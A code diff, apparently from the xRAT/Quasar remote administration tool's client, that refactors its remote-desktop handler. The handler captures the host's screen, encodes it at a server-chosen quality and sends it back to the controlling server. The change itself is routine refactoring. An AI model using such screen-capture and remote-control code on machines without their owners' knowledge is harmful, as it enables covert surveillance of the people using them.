@@ -215,43 +215,25 @@ namespace xClient.Core.Commands
 
 		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
 		{
-			if (StreamCodec == null)
-			{
-				StreamCodec = new UnsafeStreamCodec(75);
-			}
+			if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality)
+				StreamCodec = new UnsafeStreamCodec(command.Quality);
 
-			LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
-			BitmapData bmpdata = LastDesktopScreenshot.LockBits(new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), System.Drawing.Imaging.ImageLockMode.ReadWrite, LastDesktopScreenshot.PixelFormat);
+			LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Number);
+			BitmapData bmpdata = LastDesktopScreenshot.LockBits(
+				new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
+				LastDesktopScreenshot.PixelFormat);
 
-			using(MemoryStream stream = new MemoryStream())
+			using (MemoryStream stream = new MemoryStream())
 			{
-				StreamCodec.CodeImage(bmpdata.Scan0, new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), LastDesktopScreenshot.PixelFormat, stream);
-				new Packets.ClientPackets.DesktopResponse(stream.ToArray()).Execute(client);
+				StreamCodec.CodeImage(bmpdata.Scan0,
+					new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
+					new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), LastDesktopScreenshot.PixelFormat,
+					stream);
+				new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality).Execute(client);
 			}
 
 			LastDesktopScreenshot.UnlockBits(bmpdata);
 			LastDesktopScreenshot.Dispose();
-
-			/*if (LastDesktopScreenshot == null)
-			{
-				LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
-
-				byte[] desktop = Helper.Helper.CImgToByte(LastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
-
-				new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
-			}
-			else
-			{
-				Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
-				using (Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(LastDesktopScreenshot, currentDesktopScreenshot))
-				{
-					LastDesktopScreenshot = currentDesktopScreenshot;
-
-					byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
-
-					new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
-				}
-			}*/
 		}
 
 		public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
